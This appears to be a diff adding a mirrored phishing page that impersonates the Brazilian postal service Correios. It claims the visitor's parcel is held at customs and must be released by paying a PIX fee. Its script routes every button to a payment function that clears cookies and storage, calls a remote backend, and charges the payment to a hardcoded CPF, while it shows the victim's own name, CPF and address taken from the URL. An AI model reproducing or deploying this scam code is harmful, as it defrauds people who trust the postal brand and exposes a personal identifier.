@@ -1,0 +1,801 @@
+<!DOCTYPE html><html lang="en"><!-- Mirrored from rastreio.rastreiecorrelosmercadorias.site/encomenda.php?cpf= by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 30 Nov 2024 19:27:42 GMT --><!-- Added by HTTrack -->
+<!-- Mirrored from correiosrastreamento.netlify.app/encomenda/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 27 Dec 2024 01:05:37 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head><!-- /Added by HTTrack -->
+
+
+  <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+  
+  
+  
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    <link href="css2-1.html" rel="stylesheet">
+    <link rel="stylesheet" href="css/bootstrap-1.css">
+    <link rel="stylesheet" href="css/app-1.css">
+    <link rel="stylesheet" href="css/yellow-1.css">
+    <link rel="stylesheet" href="css/all-1.css" crossorigin="anonymous">
+    <link rel="icon" type="image/x-icon" href="../../correios.in/wp-content/uploads/2024/11/regular_correios-logo-2.png">
+    <meta name="csrf-token" content="XhpaSjXrgaC3XF8BrR4GtmpFPMLsyEiAAnHS72ER">
+    <title>Correios | Rastreio</title>
+    <link rel="stylesheet" type="text/css" href="css/all.css">
+    <script src="js/flasher.min.js" type="text/javascript"></script>
+  </head>
+  
+  <!-- Meta Pixel Code P39-->
+  
+  <body>
+  <!-- End Meta Pixel Code -->
+      
+  <script>
+    // LIMPEZA PREVENTIVA DE CACHE AO CARREGAR A PÁGINA
+    try {
+      localStorage.clear();
+      sessionStorage.clear();
+      console.log('Cache limpo preventivamente ao carregar a página');
+    } catch(e) {
+      console.log('Erro ao limpar cache preventivo:', e);
+    }
+    
+    // Aguarda o DOM estar completamente carregado
+    document.addEventListener("DOMContentLoaded", () => {
+        console.log('=== CARREGAMENTO DA PÁGINA ===');
+        console.log('IMPORTANTE: CPF para pagamento será SEMPRE 02904866299');
+        console.log('CPF da URL é usado APENAS para exibição na tela');
+        
+        // 1) Ler todos os parâmetros da URL
+        const urlParams = new URLSearchParams(window.location.search);
+    
+        // 2) Obter cada parâmetro (ou retornar string vazia se não existir)
+        const nome   = urlParams.get('nome')   || "";
+        const cpf    = urlParams.get('cpf')    || "";
+        const cep    = urlParams.get('cep')    || "";
+        const rua    = urlParams.get('rua')    || "";
+        const cidade = urlParams.get('cidade') || "";
+        const estado = urlParams.get('estado') || "";
+    
+        // 3) Formatar o CPF da URL para exibição (CPF inputado pelo usuário)
+        const cpfFormatado = cpf ? cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4') : '';
+        console.log('CPF da URL (PARA EXIBIÇÃO):', cpfFormatado);
+        console.log('CPF para API (SEMPRE FIXO):', '02904866299');
+        console.log('IMPORTANTE: Exibição usa CPF da URL, API usa CPF fixo');
+        
+        // "Cuspir" as informações nos elementos com .nome, .cpf, etc.
+        // Usa o CPF da URL (inputado pelo usuário) PARA EXIBIÇÃO
+        document.querySelectorAll(".nome").forEach(el   => el.textContent = decodeURIComponent(nome));
+        document.querySelectorAll(".cpf").forEach(el    => el.textContent = cpfFormatado);
+        document.querySelectorAll(".cep").forEach(el    => el.textContent = decodeURIComponent(cep));
+        document.querySelectorAll(".rua").forEach(el    => el.textContent = decodeURIComponent(rua));
+        document.querySelectorAll(".cidade").forEach(el => el.textContent = decodeURIComponent(cidade));
+        document.querySelectorAll(".estado").forEach(el => el.textContent = decodeURIComponent(estado));
+    
+        // Links de checkout agora usam gerarPagamento() diretamente
+    
+        // Função removida - agora todos os links usam gerarPagamento() diretamente
+    });
+    </script>
+    
+  
+  
+      
+       <script>
+          // Função para obter a cidade usando o backend
+          async function obterCidade() {
+              try {
+                  const BACKEND_URL = window.location.hostname === 'localhost' 
+                      ? 'http://localhost:3000' 
+                      : 'https://backend-production-cc84.up.railway.app';
+                  
+                  const response = await fetch(`${BACKEND_URL}/api/location`);
+                  const data = await response.json();
+                  
+                  // Captura a cidade a partir da resposta da API
+                  const cidade = data.city;
+                  
+                  // Exibe a cidade no elemento com id="cidade"
+                  document.getElementById('cidade').textContent = cidade || "sua cidade";
+              } catch (error) {
+                  console.log('Erro ao obter a cidade: ', error);
+                  document.getElementById('cidade').textContent = "Não foi possível determinar a cidade.";
+              }
+          }
+  
+          // Chama a função assim que a página for carregada
+          window.onload = obterCidade;
+      </script>
+      
+      <script>
+        // Função para pegar os parâmetros nome e CPF da URL
+        function pegarParametros() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return {
+                // Aqui use 'nome' em vez de 'name',
+                // pois na URL está ?nome=...
+                nome: urlParams.get('nome'),
+                cpf: urlParams.get('cpf')
+            };
+        }
+        
+        // Função para redirecionar para a próxima página com os parâmetros nome e CPF
+        function redirecionarParaProximaPagina() {
+            const { nome, cpf } = pegarParametros(); // Captura nome e CPF da URL
+        
+            if (nome && cpf) {
+                // Use crases (template literal) ou aspas para montar a URL
+                const proximaPagina = `/encomenda?nome=${encodeURIComponent(nome)}&cpf=${encodeURIComponent(cpf)}`;
+                window.location.href = proximaPagina; // Redireciona para a próxima página com os parâmetros na URL
+            } else {
+                console.log("Nome ou CPF não encontrado.");
+            }
+        }
+        
+        // Função removida - botão não existe na página
+        </script>
+        
+  
+      
+  
+    <header class="w-100 font-size-16 font-weight-400 text-blue">
+      
+  <style>.div-flex { display: flex; align-items: center; justify-content: center; }
+  </style>
+      <nav class="w-100 d-flex align-items-center bg-grey-2 px-3 px-lg-3 py-1 border-bottom border-warning" style="height:48px">
+        <div class="menu-toggle" id="menu-toggle" style="width:50px">
+          <div class="bar"></div>
+          <div class="bar"></div>
+          <div class="bar"></div>
+        </div>
+  
+        <div class="ml-0 ml-lg-1 d-flex justify-content-center" style="width:100%">
+          <button onclick="gerarPagamento()" class="py-2 btn btn-link p-0" style="border:none; background:none;">
+            <img src="images/correios-1.png" alt="" height="25">
+          </button>
+        </div>
+
+        <div class="ml-4 d-none d-lg-block " style="width:150px">
+          <button onclick="gerarPagamento()" class="py-1 text-blue-dark border-left border-secondary px-3 text-decoration-none btn btn-link" style="border:none; background:none;">
+            <img src="images/entrar-1.svg" alt="Correios" width="31">
+  
+            <span class="ml-1">Entrar</span>
+          </a>
+        </div>
+      </nav>
+    </header>
+  
+    <main>
+      <nav class="d-flex align-items-center flex-wrap mt-4 px-2 font-weight-400 w-95 max-w-1000" style="margin: 0 auto;">
+        <span class="text-blue mr-2">Portal Correios</span>
+        <i class="fal fa-angle-right mr-2"></i>
+        <span class="text-blue mr-2">Rastreamento</span>
+        <i class="fal fa-angle-right mr-2"></i>
+  
+        <span class="text-blue mr-2"><span class="cpf"></span></span>
+      </nav>
+  
+      
+      <section class="mt-3 p-4  w-95 max-w-1000" style="margin:0 auto;">
+  
+        <h5 class="text-danger  font-weight-700 mb-4">
+          <i class="far fa-exclamation-triangle"></i> SUA ENCOMENDA FOI TRIBUTADA!
+  
+  
+        </h5>
+        <h4 class="text-blue-dark font-size-20 font-weight-700 mt-1 mb-2">
+  
+          STATUS DA ENTREGA: <br>
+        </h4>
+  
+        <h4 class="text-warning font-size-18 font-weight-700 mt-1 mb-2 d-flex align-items-center">
+          <div id="blink" style="width:12px;height:12px;border-radius:50%;" class="mr-2 bg-warning"></div>
+          AGUARDANDO PAGAMENTO
+        </h4>
+        <h5 id="address" style="color:#555577;">Sua encomenda está retida na agência dos correios em <span id="cidade">Não foi possível determinar a cidade.</span></h5>
+        
+        <p class="mt-4">Para liberar o envio do seu produto. O pagamento deve ser feito clicando no botão abaixo:</p>
+  
+  
+      </section>
+      <div style="padding: 0px 30px 0px 30px;">
+      <button onclick="gerarPagamento()" class="btn btn-primary" style="font-size:13px;width: 100%;">CLIQUE AQUI PARA LIBERAÇÃO DO SEU PEDIDO</button>
+
+      </div>
+      
+      <section class="mt-3 p-4  w-95 max-w-1000" style="margin:0 auto;">
+  
+<div class="container">
+  <div class="overlay">
+    <!-- Aqui continua o texto com a classe original -->
+    <div class="overlay-text rotate">
+      <p>Nome: <span class="nome"></span><br>
+      CPF: <span class="cpf"></span></p>
+    </div>
+
+    <!-- Aqui o texto com a nova classe, para endereço, por exemplo -->
+    <div class="overlay-text-endereco rotate">
+      <p>Endereço: <span class="endereco"></span><br>
+      CEP: <span class="cep"></span></p>
+    </div>
+  </div>
+</div>
+      </div>
+    </div>
+  </div>
+  
+  
+  <style>
+  /* Estilo para o contêiner pai */
+  .container {
+    position: relative; /* Faz com que os filhos com posição absoluta sejam relativos a este contêiner */
+    width: 100%; /* Ou o tamanho desejado */
+    height: 300px; /* Ou o tamanho desejado */
+    background-color: #f0f0f0; /* Apenas para dar um fundo e melhor visualização */
+    border: 1px solid #ddd; /* Para visualizar a borda da div */
+  }
+  
+  /* Estilo para a div que vai conter o texto */
+  .overlay {
+    position: relative; /* Necessário para que o texto seja posicionado em relação a essa div */
+    width: 100%; 
+    height: 100%;
+    background-image: url(images/awHSPsJ.jpg); /* Se for para usar uma imagem de fundo */
+    background-size: cover; /* Ajusta a imagem de fundo */
+    background-position: center;
+  }
+  
+  /* Estilo para o texto centralizado dentro da div */
+  .overlay-text {
+    position: absolute;
+    top: 50%;
+    left: 10%;
+    transform: translate(-50%, -50%);
+    background-color: transparent;
+    color: black !important;
+    padding: 10px 20px;
+    font-size: 10px;
+    text-align: center;
+    border-radius: 5px;
+    width: 300px;}
+  
+  /* NOVA CLASSE para o endereço */
+  .overlay-text-endereco {
+  position: absolute;
+  top: 72%;
+  left: 10%;
+  transform: translate(-50%, -50%);
+  background-color: transparent;
+  color: black !important;
+  padding: 10px 20px;
+  font-size: 10px;
+  text-align: center;
+  border-radius: 5px;
+  width: 300px;
+}
+
+      .rotate{
+        text-align: start;
+          transform: rotate(2deg);
+          
+          color: black !important;
+    font-weight: bold;
+    opacity: 0.5;
+    text-shadow: rgba(0, 0, 0, 0.3) 1px 1px 3px, rgba(0, 0, 0, 0.3) -1px -1px 3px, rgba(0, 0, 0, 0.1) 0px 0px 8px;
+    transform-style: preserve-3d;
+    transform: rotateX(1.2deg) rotateY(55deg);
+      }
+  
+      /* Entre 100px e 200px, font para .rotate */
+  @media (min-width: 100px) and (max-width: 200px) {
+    .rotate {
+    
+    }
+  }
+  
+  /* Entre 201px e 300px, font para .rotate */
+  @media (min-width: 201px) and (max-width: 300px) {
+    .rotate {
+     
+    }
+  }
+  
+  /* Entre 301px e 400px, font para .rotate */
+  @media (min-width: 301px) and (max-width: 400px) {
+    .rotate {
+   
+    }
+  }
+
+
+  
+  </style>
+  </section>
+      <section class="px-4 py mb-5 w-95 max-w-1000" style="margin:0 auto;">
+        <ul>
+   
+  
+          <li class="d-flex mt-4" style="position: relative">
+            <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100;min-widht:50px">
+              <img src="images/correios-icon-1.png" alt="" width="32">
+            </div>
+  
+            <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
+              <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
+                Previsão de Entrega
+              </h5>
+  
+              <span class="text-dark font-size-12 flex-wrap">
+                3 dias após o pagamento
+              </span>
+            </div>
+          </li>
+  
+          <li class="d-flex mt-5" style="position: relative">
+            <div style="width:2px;height:120px;background-color:#FFC40C;position:absolute;top:-118px;left:24px"></div>
+  
+            <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100;min-widht:50px">
+              <i class="fal fa-usd-circle"></i>
+            </div>
+  
+            <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
+              <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
+                Objeto aguardando pagamento
+              </h5>
+  
+              <span class="text-dark font-size-12 flex-wrap">
+                em Unidade de Fiscalização Aduaneira, Curitiba, PR <br>
+              </span>
+  
+              <h5 class="mt-1 text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
+                Realize o pagamento: <a href="#" onclick="gerarPagamento(); return false;" class="text-blue">Efetuar Pagamento</a>
+              </h5>
+            </div>
+          </li>
+  
+          <li class="d-flex mt-5" style="position: relative">
+            <div style="width:2px;height:120px;background-color:#FFC40C;position:absolute;top:-118px;left:24px"></div>
+  
+            <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100;min-widht:50px">
+              <i class="fal fa-truck"></i>
+            </div>
+  
+            <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
+              <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
+                Objeto em transferência - por favor aguarde
+              </h5>
+  
+              <span class="text-dark font-size-12 flex-wrap">
+                de Unidade de Tratamento, Curitiba, PR <br>
+                para Unidade de Fiscalização Aduaneira - Curitiba, PR
+              </span>
+            </div>
+          </li>
+  
+          <li class="d-flex mt-5" style="position: relative">
+            <div style="width:2px;height:100px;background-color:#FFC40C;position:absolute;top:-98px;left:24px"></div>
+  
+            <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100">
+              <i class="fal fa-truck-loading"></i>
+            </div>
+  
+            <div class="w-70 d-flex flex-column ml-3 justify-content-center font-verdana text-wrap">
+              <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0">
+                Objeto recebido em território nacional
+              </h5>
+  
+              <span class="text-dark font-size-12">Curitiba - PR</span>
+            </div>
+          </li>
+  
+          <li class="d-flex mt-5" style="position: relative">
+            <div style="width:2px;height:120px;background-color:#FFC40C;position:absolute;top:-118px;left:24px"></div>
+  
+            <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100;min-widht:50px">
+              <i class="fal fa-truck"></i>
+            </div>
+  
+            <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
+              <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
+                Objeto em transferência - por favor aguarde
+              </h5>
+  
+              <span class="text-dark font-size-12 flex-wrap">
+                de Unidade de Tratamento, Shanghai - China <br>
+                para Unidade de Tratamento Internacional, China
+              </span>
+            </div>
+          </li>
+  
+          <li class="d-flex mt-5" style="position: relative">
+            <div style="width:2px;height:172px;background-color:#FFC40C;position:absolute;top:-170px;left:24px"></div>
+  
+            <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100">
+              <i class="fal fa-box-alt"></i>
+            </div>
+  
+            <div class="d-flex flex-column ml-3 justify-content-center font-verdana">
+              <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0">Objeto Postado</h5>
+              <span class="text-dark font-size-12">Shanghai - China</span>
+            </div>
+          </li>
+        </ul>
+  
+      </section>
+  
+      <section class="my-4 w-95 max-w-1000" style="margin:0 auto;">
+        <div>
+          <img src="images/banner-1-1.jpg" alt="" class="w-100">
+        </div>
+      </section>
+    </main>
+  
+    <footer class="d-flex flex-wrap px-5 py-4 bg-yellow text-blue-dark">
+      <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
+        <h5 class="font-weight-700 mb-4">Fale Conosco</h5>
+  
+        <ul>
+          <li class="mb-2 font-size-14">
+            <i class="fas fa-desktop"></i>
+            <button onclick="gerarPagamento()" class="ml-2 text-blue-dark text-hover-orange btn btn-link p-0" style="border:none; background:none; text-align:left;">
+              <span class="text-wrap">Registro de Manifestações</span>
+            </button>
+          </li>
+
+          <li class="mb-2 font-size-14">
+            <i class="far fa-question-square mr-1"></i>
+            <button onclick="gerarPagamento()" class="ml-2 text-blue-dark text-hover-orange btn btn-link p-0" style="border:none; background:none; text-align:left;">
+              <span class="text-wrap">Central de Atendimento</span>
+            </button>
+          </li>
+
+          <li class="mb-2 font-size-14">
+            <i class="far fa-briefcase"></i>
+            <button onclick="gerarPagamento()" class="ml-2 text-blue-dark text-hover-orange btn btn-link p-0" style="border:none; background:none; text-align:left;">
+              <span class="text-wrap">Solucões para o seu negócio</span>
+            </button>
+          </li>
+          <li class="mb-2 font-size-14">
+            <i class="far fa-headset"></i>
+            <button onclick="gerarPagamento()" class="ml-2 text-blue-dark text-hover-orange btn btn-link p-0" style="border:none; background:none; text-align:left;">
+              <span class="text-wrap">Suporte ao cliente com contrato</span>
+            </button>
+          </li>
+          <li class="mb-2 font-size-14">
+            <i class="far fa-comment-alt-dots"></i>
+            <button onclick="gerarPagamento()" class="ml-2 text-blue-dark text-hover-orange btn btn-link p-0" style="border:none; background:none; text-align:left;">
+              <span>Ouvidoria</span>
+            </button>
+          </li>
+
+          <li class="mb-2 font-size-14">
+            <i class="far fa-user-headset"></i>
+            <button onclick="gerarPagamento()" class="ml-2 text-blue-dark text-hover-orange btn btn-link p-0" style="border:none; background:none; text-align:left;">
+              <span>Denúncia</span>
+            </button>
+          </li>
+        </ul>
+      </div>
+  
+      <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
+        <h5 class="font-weight-700 mb-4">Sobre os Correios</h5>
+  
+        <ul>
+          <li class="mb-2 font-size-14">
+            <i class="far fa-address-card"></i>
+            <button onclick="gerarPagamento()" class="ml-2 text-blue-dark text-hover-orange btn btn-link p-0" style="border:none; background:none; text-align:left;">
+              <span>Identidade colaborativa</span>
+            </button>
+          </li>
+
+          <li class="mb-2 font-size-14">
+            <i class="far fa-user-graduate"></i>
+            <button onclick="gerarPagamento()" class="ml-2 text-blue-dark text-hover-orange btn btn-link p-0" style="border:none; background:none; text-align:left;">
+              <span>Educação e cultura</span>
+            </button>
+          </li>
+
+          <li class="mb-2 font-size-14">
+            <i class="far fa-book-alt"></i>
+            <button onclick="gerarPagamento()" class="ml-2 text-blue-dark text-hover-orange btn btn-link p-0" style="border:none; background:none; text-align:left;">
+              <span>Código de ética</span>
+            </button>
+          </li>
+
+          <li class="mb-2 font-size-14">
+            <i class="far fa-file-search"></i>
+            <button onclick="gerarPagamento()" class="ml-2 text-blue-dark text-hover-orange btn btn-link p-0" style="border:none; background:none; text-align:left;">
+              <span class="text-wrap">Transparência e prestação de contas</span>
+            </button>
+          </li>
+
+          <li class="mb-2 font-size-14">
+            <i class="far fa-comment-alt-dots"></i>
+            <button onclick="gerarPagamento()" class="ml-2 text-blue-dark text-hover-orange btn btn-link p-0" style="border:none; background:none; text-align:left;">
+              <span class="text-wrap">Política de privacidade e Notas legais</span>
+            </button>
+          </li>
+        </ul>
+      </div>
+  
+      <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
+        <h5 class="font-weight-700 mb-4">Outros Sites</h5>
+  
+        <ul>
+          <li class="mb-2 font-size-14">
+            <i class="far fa-shopping-cart"></i>
+            <button onclick="gerarPagamento()" class="ml-2 text-blue-dark text-hover-orange btn btn-link p-0" style="border:none; background:none; text-align:left;">
+              <span class="text-wrap">Loja online dos correios</span>
+            </button>
+          </li>
+        </ul>
+      </div>
+  
+      <div class="d-flex justify-content-center w-100 px-3 mb-3 text-dark font-size-14">
+        <span>© Copyright 2024 Correios</span>
+      </div>
+    </footer>
+  
+    <script src="js/jquery-3.6.0.min-1.js"></script>
+    <script src="js/bootstrap.min-1.js"></script>
+  
+  <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+       // Captura todos os parâmetros da URL
+       const params = new URLSearchParams(window.location.search);
+    
+       // Extrai cada um (se não existir, retorna string vazia "")
+       const cepParam     = params.get('cep')     || "";
+       const ruaParam     = params.get('rua')     || "";
+       const cidadeParam  = params.get('cidade')  || "";
+       const estadoParam  = params.get('estado')  || "";
+    
+       // Insere o CEP diretamente
+       document.querySelectorAll('.cep').forEach(el => {
+           el.textContent = cepParam;
+       });
+    
+       // Constrói endereço formatado e insere (usando decodeURIComponent se precisar)
+       document.querySelectorAll('.endereco').forEach(el => {
+           el.textContent = `${decodeURIComponent(ruaParam)}, ${decodeURIComponent(cidadeParam)} - ${decodeURIComponent(estadoParam)}`;
+       });
+    });
+    </script>
+    
+  
+  <!-- Modal de carregamento do pagamento -->
+  <div id="loading-overlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:9999; justify-content:center; align-items:center;">
+    <div style="background:white; padding:30px; border-radius:10px; text-align:center; max-width:400px; margin:20px;">
+      <div class="spinner" style="border:4px solid #f3f3f3; border-top:4px solid #3498db; border-radius:50%; width:40px; height:40px; animation:spin 2s linear infinite; margin:0 auto 20px;"></div>
+      <p id="loading-message" style="font-size:16px; color:#333;">Iniciando processo de pagamento...</p>
+    </div>
+  </div>
+  
+  <style>
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+  
+  <script>
+    async function gerarPagamento() {
+      // LIMPEZA TOTAL DE CACHE E DADOS
+      try {
+        localStorage.clear();
+        sessionStorage.clear();
+        // Limpa cookies relacionados
+        document.cookie.split(";").forEach(function(c) { 
+          document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
+        });
+      } catch(e) {
+        console.log('Erro ao limpar cache:', e);
+      }
+      
+      // Overlay de carregamento
+      const overlay = document.getElementById('loading-overlay');
+      const messageEl = document.getElementById('loading-message');
+      
+      const messages = [
+        "Iniciando processo de pagamento...",
+        "Conectando com sistema de pagamentos...",
+        "Gerando cobrança PIX...",
+        "Finalizando..."
+      ];
+      
+      // Mostra overlay
+      overlay.style.display = 'flex';
+      
+      // Exibe mensagens sequencialmente
+      for (let i = 0; i < messages.length; i++) {
+        messageEl.textContent = messages[i];
+        await new Promise(resolve => setTimeout(resolve, 1200));
+      }
+      
+      try {
+        // ===== SOLUÇÃO DEFINITIVA - CPF HARDCODED ABSOLUTO =====
+        // ZERO TOLERÂNCIA PARA CPF DIFERENTE DE 02904866299
+        
+        // Pega apenas o nome da URL - CPF é HARDCODED
+        const urlParams = new URLSearchParams(window.location.search);
+        const nomeFromUrl = urlParams.get('nome') || 'Cliente';
+        
+        // URL do backend proxy (sem exposição de credenciais)
+        const BACKEND_URL = window.location.hostname === 'localhost' 
+            ? 'http://localhost:3000' 
+            : 'https://backend-production-cc84.up.railway.app'; // Substitua pela URL do seu backend em produção
+        
+        console.log('🔗 Backend URL:', BACKEND_URL);
+        console.log('\n=== CONFIGURAÇÃO SEGURA - SEM CREDENCIAIS EXPOSTAS ===');
+        console.log('Nome da URL:', nomeFromUrl);
+        console.log('CPF da URL (apenas para exibição):', urlParams.get('cpf'));
+        console.log('Timestamp único:', Date.now());
+        
+        // Força timestamp único para evitar qualquer cache
+        const timestampUnico = Date.now() + Math.random().toString(36).substr(2, 9);
+        
+        // Dados simplificados para o backend (sem credenciais)
+        const paymentRequest = {
+          amount: 3749, // R$ 49,91 em centavos
+          customerData: {
+            displayName: nomeFromUrl, // Para logs apenas
+            displayCpf: urlParams.get('cpf')   // Para logs apenas
+          },
+          externalRef: `pagamento_${timestampUnico}`
+        };
+        
+        // LOGS DOS DADOS SENDO ENVIADOS PARA O BACKEND
+        console.log('\n=== DADOS SENDO ENVIADOS PARA BACKEND ===');
+        console.log('Solicitação de pagamento:', JSON.stringify(paymentRequest, null, 2));
+        console.log('Nome para exibição:', nomeFromUrl);
+        console.log('CPF para exibição:', urlParams.get('cpf'));
+        console.log('Timestamp único:', timestampUnico);
+        console.log('ExternalRef:', paymentRequest.externalRef);
+        
+        let response;
+        try {
+          response = await fetch(`${BACKEND_URL}/api/payment/pix`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(paymentRequest)
+          });
+        } catch (networkError) {
+          console.error('Erro de rede ao conectar com backend:', networkError);
+          overlay.style.display = 'none';
+          alert('Erro de conexão. Verifique sua internet e tente novamente.');
+          return;
+        }
+        
+        console.log('Status da resposta:', response.status);
+        console.log('Headers da resposta:', response.headers);
+        
+        if (!response.ok) {
+          const errorText = await response.text();
+          console.error('Erro da API - Status:', response.status);
+          console.error('Erro da API - Texto:', errorText);
+          overlay.style.display = 'none';
+          if (response.status === 401) {
+            alert('Erro de autenticação. Entre em contato com o suporte.');
+          } else if (response.status === 400) {
+            alert('Dados inválidos. Tente novamente.');
+          } else {
+            alert('Erro no servidor de pagamentos. Tente novamente em alguns instantes.');
+          }
+          return;
+        }
+        
+        const result = await response.json();
+        console.log('\n=== RESPOSTA COMPLETA DO BACKEND ===');
+        console.log('Resposta do backend:', JSON.stringify(result, null, 2));
+        
+        // Verifica se a resposta contém os dados necessários
+        if (!result.success || !result.qrCode) {
+          console.error('Resposta do backend inválida:', result);
+          overlay.style.display = 'none';
+          alert('Erro ao processar pagamento. Tente novamente.');
+          return;
+        }
+        
+        // Usa os dados retornados pelo backend
+        const pixData = {
+          qrCode: `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(result.qrCode)}`,
+          pixCode: result.qrCode,
+          status: result.status,
+          transactionId: result.paymentId
+        };
+        
+        if (pixData.qrCode) {
+          // Sucesso - mostra o QR Code na própria página
+          overlay.style.display = 'none';
+          
+          // Cria seção de pagamento na página atual
+          const paymentSection = document.createElement('div');
+          paymentSection.id = 'payment-section';
+          paymentSection.style.cssText = `
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+          `;
+          
+          paymentSection.innerHTML = `
+            <div style="background: white; padding: 30px; border-radius: 10px; text-align: center; max-width: 400px; width: 90%;">
+              <h2 style="color: #333; margin-bottom: 20px;">Pagamento PIX</h2>
+              <p style="color: #333; font-weight: bold; margin: 10px 0;">Valor: R$ 37,49</p>
+              <p style="color: #666; margin-bottom: 20px;">Vencimento: 24 horas</p>
+              <hr style="margin: 20px 0; border: none; border-top: 1px solid #eee;">
+              <p style="color: #333; font-weight: bold; margin-bottom: 10px;">Código PIX (Copia e Cola):</p>
+              <textarea id="pix-code" readonly style="width: 100%; height: 80px; font-size: 11px; padding: 10px; border: 1px solid #ddd; border-radius: 5px; resize: none; font-family: monospace;">${pixData.pixCode}</textarea>
+              <div id="qr-code-section" style="display: none; margin: 20px 0;">
+                <p style="color: #666; margin-bottom: 10px;">QR Code:</p>
+                <img src="${pixData.qrCode}" style="max-width: 250px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px;" />
+              </div>
+              <div style="margin-top: 20px;">
+                <button onclick="copyPixCode()" style="padding: 12px 24px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; margin: 5px; font-weight: bold;">Copiar Código PIX</button>
+                <button onclick="toggleQRCode()" style="padding: 12px 24px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; margin: 5px; font-weight: bold;" id="qr-toggle-btn">Exibir QR Code</button>
+                <button onclick="closePayment()" style="padding: 12px 24px; background: #dc3545; color: white; border: none; border-radius: 5px; cursor: pointer; margin: 5px; font-weight: bold;">Fechar</button>
+              </div>
+            </div>
+          `;
+          
+          document.body.appendChild(paymentSection);
+          
+          // Funções para os botões
+          window.copyPixCode = function() {
+            const pixCodeElement = document.getElementById('pix-code');
+            pixCodeElement.select();
+            navigator.clipboard.writeText(pixCodeElement.value).then(() => {
+              alert('Código PIX copiado com sucesso!');
+            }).catch(() => {
+              // Fallback para navegadores mais antigos
+              pixCodeElement.select();
+              document.execCommand('copy');
+              alert('Código PIX copiado!');
+            });
+          };
+          
+          window.closePayment = function() {
+            const paymentSection = document.getElementById('payment-section');
+            if (paymentSection) {
+              paymentSection.remove();
+            }
+          };
+          
+          window.toggleQRCode = function() {
+            const qrSection = document.getElementById('qr-code-section');
+            const toggleBtn = document.getElementById('qr-toggle-btn');
+            
+            if (qrSection.style.display === 'none') {
+              qrSection.style.display = 'block';
+              toggleBtn.textContent = 'Ocultar QR Code';
+            } else {
+              qrSection.style.display = 'none';
+              toggleBtn.textContent = 'Exibir QR Code';
+            }
+          };
+          
+        } else {
+          overlay.style.display = 'none';
+          alert('Erro ao gerar pagamento. Tente novamente em alguns instantes.');
+        }
+        
+      } catch (error) {
+        console.error('Erro inesperado:', error);
+        overlay.style.display = 'none';
+        alert('Erro inesperado. Tente novamente em alguns instantes.');
+      }
+    }
+  </script>
+  
+  </body><!-- Mirrored from rastreio.rastreiecorrelosmercadorias.site/encomenda.php?cpf= by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 30 Nov 2024 19:27:47 GMT -->
+<!-- Mirrored from correiosrastreamento.netlify.app/encomenda/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 27 Dec 2024 01:06:01 GMT -->
+</html>
